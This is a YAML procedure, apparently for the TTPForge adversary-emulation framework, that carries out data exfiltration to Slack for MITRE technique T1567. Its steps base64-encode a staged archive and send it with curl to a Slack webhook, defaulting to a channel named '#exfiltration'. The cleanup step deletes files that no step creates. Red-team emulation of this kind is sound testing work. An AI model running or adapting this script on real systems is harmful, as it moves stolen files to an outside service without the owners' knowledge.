---
api_version: 2.0
uuid: b4c5d6e7-f8a0-4091-a2b3-c4d5e6f7a8b9
name: Slack File Upload
authors:
- TTPForge
description: |
  Exfiltrates data by uploading files to Slack via webhook or API
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1567 Exfiltration Over Web Service
requirements:
  platforms:
  - os: darwin
args:
- name: file_path
  description: File to upload to Slack
  type: string
  default: /tmp/.staging/data.tar.gz
- name: slack_webhook_url
  description: Slack incoming webhook URL
  type: string
  default: https://hooks.slack.com/services/T00000000/B00000000/XXXX
- name: slack_channel
  description: Target Slack channel
  type: string
  default: '#exfiltration'
- name: message_text
  description: Message text with file
  type: string
  default: Exfiltrated data attached
steps:
- name: Verify file exists
  inline: test -f '{{ .Args.file_path }}' || (echo 'File not found'; exit 1)
- name: Prepare file for Slack
  inline: |
    echo "Slack Upload Configuration:"
    echo "  File: $(basename '{{ .Args.file_path }}')"
    echo "  Size: $(du -h '{{ .Args.file_path }}' | cut -f1)"
    echo "  Channel: {{ .Args.slack_channel }}"
    echo "  Message: {{ .Args.message_text }}"
- name: Convert to base64 for transmission
  inline: |
    echo "File encoding:"
    encoded_size=$(base64 < '{{ .Args.file_path }}' | wc -c)
    echo "  Encoded size: $encoded_size bytes"
- name: Upload to Slack
  inline: |
    filesize=$(du -h '{{ .Args.file_path }}' | cut -f1)
    filename=$(basename '{{ .Args.file_path }}')
    encoded=$(base64 < '{{ .Args.file_path }}')
    json_payload="{\"channel\": \"{{ .Args.slack_channel }}\", \"text\": \"{{ .Args.message_text }}\", \"attachments\": [{\"fallback\": \"File Upload\", \"title\": \"${filename}\", \"text\": \"File size: ${filesize}\\nData: ${encoded}\"}]}"
    curl -X POST \
      -H "Content-type: application/json" \
      --data "$json_payload" \
      '{{ .Args.slack_webhook_url }}'
  cleanup:
    inline: rm -f /tmp/test_slack.dat /tmp/slack_payload.json
tests:
- name: dry_run_test
  dry_run: true
